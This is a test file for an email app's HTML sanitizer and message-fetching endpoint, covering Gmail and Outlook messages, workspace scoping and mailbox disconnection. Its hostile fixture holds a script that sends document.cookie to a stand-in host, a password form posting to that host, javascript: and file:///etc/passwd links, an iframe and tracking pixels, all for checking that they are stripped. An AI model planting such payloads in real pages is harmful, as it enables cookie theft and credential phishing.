/**
 * Reading an email the way its sender laid it out (src/mail/original.ts, src/http/mail.ts): fetched from the mailbox
 * when opened, cleaned so nothing in it can act, pictures from other sites left out until asked for, and only for a
 * message of a thread in the caller's own workspace, from a mailbox still connected.
 */
import { beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { cleanEmail } from '../src/mail/original';
import { boot, connectApp, connectGmail, fake, jobs, newWorkspace, rows, type Client } from './helpers';

let w: Client;
let box: { connectionId: string; account: string };

const HOSTILE = `<html><head><title>x</title><style>.card > p { color: #333 } .hero { background: url("https://track.test/hero.png") } @import url(https://evil.test/a.css);</style>
<script>fetch('https://evil.test/' + document.cookie)</script></head>
<body><p onclick="steal()">Your invoice is ready. <a href="https://pay.test/invoice/42">View invoice</a> or <a href="javascript:alert(1)">this</a>.</p>
<img src="https://track.test/open.gif" width="1" height="1"><img src="cid:logo@x" alt="Acme logo">
<table style="background-image:url('//track.test/bg.png');color:blue"><tr><td>Total</td><td>$42</td></tr></table>
<form action="https://evil.test/login"><input name="password"></form><iframe src="https://evil.test"></iframe><svg><script>1</script></svg></body></html>`;

const deliver = async (m: { from: string; subject: string; body: string; html?: string }) => {
  const d = fake().deliver(box.account, m);
  await (await boot()).request('/api/hooks/composio', { method: 'POST', headers: d.webhook.headers, body: d.webhook.body });
  await jobs().drain();
  const t = (await w.state()).threads.find((x) => x.subject === m.subject)!;
  return { t, id: t.messages.at(-1)!.id };
};
const original = async (c: Client, thread: string, message: string, images = false) => {
  const r = await c.request('GET', `/api/v1/mail/original?thread=${encodeURIComponent(thread)}&message=${encodeURIComponent(message)}${images ? '&images=1' : ''}`);
  return { status: r.status, body: (await r.json()) as { html?: string; text?: string; blocked: number; error?: string }, cache: r.headers.get('cache-control') };
};
const fetches = () => fake().calls.filter((c) => c.connectedAccountId === box.account && c.slug === 'GMAIL_FETCH_MESSAGE_BY_MESSAGE_ID').length;

beforeAll(async () => {
  await boot();
});
beforeEach(async () => {
  jobs().queue = [];
  w = await newWorkspace('Reader');
  box = await connectGmail(w, 'owner@reader.test');
  await jobs().drain();
});

describe('cleaning an email', () => {
  it('keeps the formatting and the links, and drops everything that can act', () => {
    const { html } = cleanEmail(HOSTILE, false);
    expect(html).toContain('<a href="https://pay.test/invoice/42" target="_blank" rel="noopener noreferrer nofollow">View invoice</a>');
    expect(html).toContain('<td>$42</td>');
    expect(html).toContain('.card > p { color: #333 }');
    for (const gone of ['<script', 'onclick', 'javascript:', '<form', '<input', '<iframe', '<svg', '@import', 'document.cookie', '<title']) expect(html).not.toContain(gone);
  });

  it('leaves out pictures and backgrounds from other sites until asked, and counts them', () => {
    const off = cleanEmail(HOSTILE, false);
    expect(off.blocked).toBe(3);
    expect(off.html).not.toContain('track.test');
    expect(off.html).toContain('alt="Acme logo"');
    const on = cleanEmail(HOSTILE, true);
    expect(on.blocked).toBe(0);
    expect(on.html).toContain('src="https://track.test/open.gif"');
    // A picture asked for with no scheme or over plain HTTP is asked for over HTTPS, and the CSS still parses.
    expect(on.html).toContain("background-image:url('https://track.test/bg.png')");
    expect(cleanEmail('<img src="http://x.test/a.png">', true).html).toContain('src="https://x.test/a.png"');
  });

  it('a link can only go to the web, an email address or a phone number', () => {
    const { html } = cleanEmail('<a href="mailto:a@b.test">m</a><a href="tel:+15551234">t</a><a href="data:text/html,x">d</a><a href="file:///etc/passwd">f</a><a href="//evil.test">p</a>', true);
    expect(html).toContain('href="mailto:a@b.test"');
    expect(html).toContain('href="tel:+15551234"');
    for (const gone of ['data:text/html', 'file:', '//evil.test']) expect(html).not.toContain(gone);
  });
});

describe('opening an email', () => {
  it('fetches the HTML from Gmail when it is opened, cleaned, and asks once for a while', async () => {
    const { t, id } = await deliver({ from: 'Billing <billing@pay.test>', subject: 'Invoice 42', body: 'Your invoice is ready.', html: HOSTILE });
    expect(fetches()).toBe(0);
    const r = await original(w, t.id, id);
    expect(r.status).toBe(200);
    expect(r.cache).toBe('private, no-store');
    expect(r.body.html).toContain('View invoice');
    expect(r.body.html).not.toContain('<script');
    expect(r.body.blocked).toBe(3);
    await original(w, t.id, id);
    expect(fetches()).toBe(1);
    // Asking for the pictures is another look, with them in.
    const shown = await original(w, t.id, id, true);
    expect(shown.body.html).toContain('https://track.test/open.gif');
    expect(fetches()).toBe(2);
    expect(await rows(`select 1 from provider_call where workspace_id = $1 and op = 'GMAIL_FETCH_MESSAGE_BY_MESSAGE_ID'`, [w.workspaceId])).toHaveLength(2);
  });

  it('a plain-text email comes back as text', async () => {
    const { t, id } = await deliver({ from: 'Dana <dana@acme.test>', subject: 'Plain', body: 'Hi,\n\nSee https://acme.test/doc for the draft.\n\nDana' });
    const r = await original(w, t.id, id);
    expect(r.body.html).toBeUndefined();
    expect(r.body.text).toContain('See https://acme.test/doc for the draft.');
  });

  it('only a message of a thread in this workspace, from a mailbox still connected', async () => {
    const { t, id } = await deliver({ from: 'Dana <dana@acme.test>', subject: 'Private', body: 'Only for us.', html: '<p>Only for us.</p>' });
    const other = await newWorkspace('Elsewhere');
    expect((await original(other, t.id, id)).status).toBe(404);
    expect((await original(w, t.id, 'not-a-message')).status).toBe(404);
    expect((await original(w, 'g-nothing', id)).status).toBe(404);
    expect((await w.request('GET', '/api/v1/mail/original')).status).toBe(400);
    // Seen once, then the mailbox is disconnected: the copy kept for a while is not shown any more.
    expect((await original(w, t.id, id)).status).toBe(200);
    await w.post('/api/v1/connections/gmail/disconnect');
    expect((await original(w, t.id, id)).status).toBe(404);
  });

  it('reads an Outlook email’s HTML too', async () => {
    const o = await newWorkspace('Outlook reader');
    const ob = await connectApp(o, 'outlook', 'owner@outlook.test');
    await jobs().drain();
    const d = fake().deliver(ob.account, { from: 'Sam <sam@vendor.test>', subject: 'Quote', body: 'The quote is attached.', html: '<div><b>The quote</b> is <a href="https://vendor.test/q">here</a>.</div>' });
    await (await boot()).request('/api/hooks/composio', { method: 'POST', headers: d.webhook.headers, body: d.webhook.body });
    await jobs().drain();
    const t = (await o.state()).threads.find((x) => x.subject === 'Quote')!;
    const r = await original(o, t.id, t.messages.at(-1)!.id);
    expect(r.status).toBe(200);
    expect(r.body.html).toContain('<b>The quote</b>');
    expect(r.body.html).toContain('href="https://vendor.test/q"');
  });
});
